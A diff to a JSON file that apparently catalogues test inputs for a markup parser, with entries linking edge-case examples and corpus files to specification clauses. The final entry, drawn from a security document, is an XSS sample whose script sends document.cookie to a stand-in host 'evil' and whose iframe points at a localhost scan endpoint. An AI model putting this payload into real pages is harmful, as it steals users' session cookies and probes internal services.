@@ -3766,5 +3766,60 @@
     "entries": [
       "U-253"
     ]
+  },
+  {
+    "cause": "C40",
+    "clause": "C2-I-043 C2-I-047",
+    "path": "resources/examples/edge-cases/0780-a-braced-opener-forms-before-an-enclosing-closer-takes-its-block.md",
+    "line": 92,
+    "input": "/{+a/{k=b+}\n",
+    "check": "explained",
+    "entries": [
+      "U-254"
+    ]
+  },
+  {
+    "cause": "C40",
+    "clause": "C2-I-043 C2-I-047",
+    "path": "tests/corpus/780-a-braced-opener-forms-before-an-enclosing-closer-takes-its-block-8.crv",
+    "line": 1,
+    "input": "/{+a/{k=b+}\n",
+    "check": "explained",
+    "entries": [
+      "U-254"
+    ]
+  },
+  {
+    "cause": "C40",
+    "clause": "C2-I-023 C2-I-047",
+    "path": "resources/examples/edge-cases/0785-a-comment-inside-a-split-combined-token-is-removed-before-pairing.md",
+    "line": 44,
+    "input": "/x /*a %% b*/{.c} y\n",
+    "check": "explained",
+    "entries": [
+      "U-254"
+    ]
+  },
+  {
+    "cause": "C40",
+    "clause": "C2-I-023 C2-I-047",
+    "path": "tests/corpus/785-a-comment-inside-a-split-combined-token-is-removed-before-pairing-4.crv",
+    "line": 1,
+    "input": "/x /*a %% b*/{.c} y\n",
+    "check": "explained",
+    "entries": [
+      "U-254"
+    ]
+  },
+  {
+    "cause": "C38",
+    "clause": "C2-I-047",
+    "path": "docs/security.md",
+    "line": 498,
+    "input": "<iframe src=\"http://localhost:8080/scan\"></iframe>\n<script>fetch(\"//evil/?\" + document.cookie)</script>\n",
+    "check": "explained",
+    "entries": [
+      "U-255"
+    ]
   }
 ]
